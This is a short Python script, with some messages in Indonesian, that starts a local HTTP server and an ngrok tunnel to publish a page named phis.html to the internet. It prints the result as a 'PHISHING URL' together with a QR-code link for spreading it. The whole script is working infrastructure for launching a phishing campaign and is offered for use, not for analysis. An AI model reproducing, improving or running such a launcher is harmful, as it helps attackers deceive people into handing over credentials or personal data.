#!/usr/bin/env python3
import subprocess, time, sys, os, signal, json, urllib.request

DIR = os.path.dirname(os.path.abspath(__file__))
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8082

http_proc = None
ngrok_proc = None

def cleanup(sig=None, frame=None):
    for p in [http_proc, ngrok_proc]:
        if p and p.poll() is None:
            p.terminate()
            try:
                p.wait(timeout=3)
            except:
                pass
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

http_proc = subprocess.Popen(
    [sys.executable, "-m", "http.server", str(PORT)],
    cwd=DIR,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
print(f"[+] HTTP server running on http://0.0.0.0:{PORT}")

ngrok_proc = subprocess.Popen(
    ["ngrok", "http", str(PORT), "--log=stdout"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
print(f"[+] Ngrok tunnel starting...")

time.sleep(4)

public_url = None
for attempt in range(5):
    try:
        resp = urllib.request.urlopen("http://localhost:4040/api/tunnels", timeout=3)
        data = json.loads(resp.read())
        tunnels = data.get("tunnels", [])
        for t in tunnels:
            if t.get("public_url", "").startswith("https"):
                public_url = t["public_url"]
                break
        if public_url:
            break
    except:
        pass
    time.sleep(1)

print()
if public_url:
    target = public_url + "/phis.html"
    print(f"[+] PHISHING URL: {target}")
    print(f"[+] QR: https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={target}")
else:
    print("[!] Gagal mendapatkan URL ngrok. Pastikan ngrok terinstall.")
    print("[!] Cek manual: curl http://localhost:4040/api/tunnels")
print()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    cleanup()
